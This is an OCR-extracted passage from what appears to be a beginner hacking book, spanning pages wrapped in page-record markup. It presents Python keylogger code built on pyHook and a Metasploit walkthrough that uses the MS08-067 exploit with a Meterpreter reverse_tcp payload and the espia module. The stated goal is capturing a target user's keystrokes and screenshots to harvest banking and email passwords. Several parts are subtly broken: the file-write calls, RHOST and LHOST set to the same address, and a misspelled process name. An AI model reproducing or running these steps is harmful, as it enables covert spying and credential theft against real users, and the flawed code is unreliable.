    ```\n\n```\n#this function is called every time a key is pressed\ndef OnKeyPress(event):\n\
    \    fob = open(log_file, 'a')\n    fob.write(event,'\\n')\n    fob.writer('\\\
    n')\n```\n\n```\nif event.ASCII==96: #96 is the ascii value of the grave key\n\
    \    fob.close()\n    new_hook.cancel()\n\n#instantiate HookManager class\nnew_hook=pyhook.HookManager()\n\
    #listen to all keystrokes\nnew_hook.KeyDown=OnKeyPress\n#hook the keyboard\nnew_hook.HookKeyboard()\n\
    #start the session\nnew_hook.start()\n```\n\nThis is just a basic code that you\
    \ will be able to use in order to create the keylogger that you want to get things\
    \ done. You can always add on more or take off parts based on what you would like\
    \ to see happen within the program, but this one is going to help you to keep\
    \ track of the keystrokes that are going on, keeps them in a method that you are\
    \ able to read rather than doing one character at a time, and helps you to see\
    \ what time everything is being typed out for your own use.\n\n# Getting Screenshots\n\
    \nNow the keylogger can be a really powerful tool when you are working with hacking,\
    \ but it can only go far. For example, if the target user is clicking on a link\
    \ to get to their banking, email, or another place rather than typing in the URL\
    \ online, how are you"
  merge: -1
  img_proc: true
- pgno: 35
  md: 'supposed to know where the usernames and passwords are that you collect? This
    can be one of the shortfalls of the keylogger, but luckily you are able to combine
    it together with taking screenshots of the target users computer in order to get
    the information that you are looking.


    The screenshots are useful because they will take periodic screenshots of the
    target users computer. When you combine this together with the keylogger, you
    are sure to get a clear picture of the websites that are being used during the
    day as well as the username and passwords that the user puts in. As long as you
    remember to put in the time and date stamps on both the screenshots and the keylogger,
    you are going to be able to compare the two and get all the information that you
    need.


    So the first thing you will need to set up your hack. You will be able to use
    the MS08_067_netapi exploit if you are trying to do the hack on a Windows computer.
    It is pretty easy to get started with and it is the one that we are working for
    this section. To set up the exploit, set up the following code:


    ```

    msf> use exploit/windows/smb/ms08_067_netapi

    ```


    Once you have this code into the system, you will then need to add on the different
    processes that are going to capture the screens that you want. You will use the
    Metasploit''s Meterpreter to do this without much hassle. If you would like to
    get this program to start working with the exploit we are setting up, you will
    just need to type in the following syntax for a code:


    ```

    msf> (ms08_067_netapi) set payload windows/meterpreter/reverse_tcp

    ```


    Now that you have this set up, it is time to set up the different options that
    you will use. There are several options are allowed on this system, and you will
    have some freedom to get this done. The next command will let you see all the
    options you would like to use, and you can pick out the choice that is going to
    work for you:


    ```

    msf> (ms08_067_netapi) show options

    ```


    At this point, it is possible to see the RHOST, or the victim that you want to
    use, as well as the LHOST, or your information, show up on the screen. You need
    to keep track of those that you are able to put them into the codes properly.
    If you mess them up or get mixed around, you will find it can be really hard to
    set up the attack. These are the IP addresses that you will need to keep things
    in order and to get your screenshot attack to work out well. Here are the two
    codes that you will need to set up if you would'
  merge: -1
  img_proc: true
- pgno: 36
  md: 'like set up the attack that you need.


    ```

    msf> (ms08_067_netapi) set RHOST 192.168.1.108

    msf> (ms08_067_netapi) set LHOST 192.168.1.108

    ```


    If you have done this properly, you should start getting screenshots of the target
    computer that you are looking for. You will have the control that you were looking
    for on the target computer and it will be easier to take over all the screenshots
    that you need for this part.


    During the next step, we are going to learn how to take that control over the
    target computer and get the screenshots that you need. But before that happens,
    we deed to figure out the PID that you want to use. To get the PID code, you just
    need to type in the syntax:


    ```

    meterpreter > getpid

    ```


    You should now have a screen that comes up and is showing you the PID that is
    on the target computer. For this particular one, we are going to have our PID
    set at 932, but it will change based on what your target computer is telling you.
    Now that you are in possession of this number, you can check which process it
    is by using the following code:


    ```

    meterpreter > ps

    ```


    When you use this code in order to look up the PID that corresponds to your target
    computer, you should be able to notice that it is going to correspond to the process
    schhost.exe. Since you should use this as the active desktop permission process,
    you are all ready to go. If you don''t already have the permissions from this
    process, you may have to do a bit more work, but this should get you the permissions
    that you need. Now you should work on activating the script that is inside of
    your Meterpreter by typing in the following syntax:


    ```

    meterpreter > use espia

    ```


    By having this script work, you are going to install your espia.app onto your
    target computer. This should make it easier to pull up the screenshots that you
    are looking for.'
  merge: -1
  img_proc: true
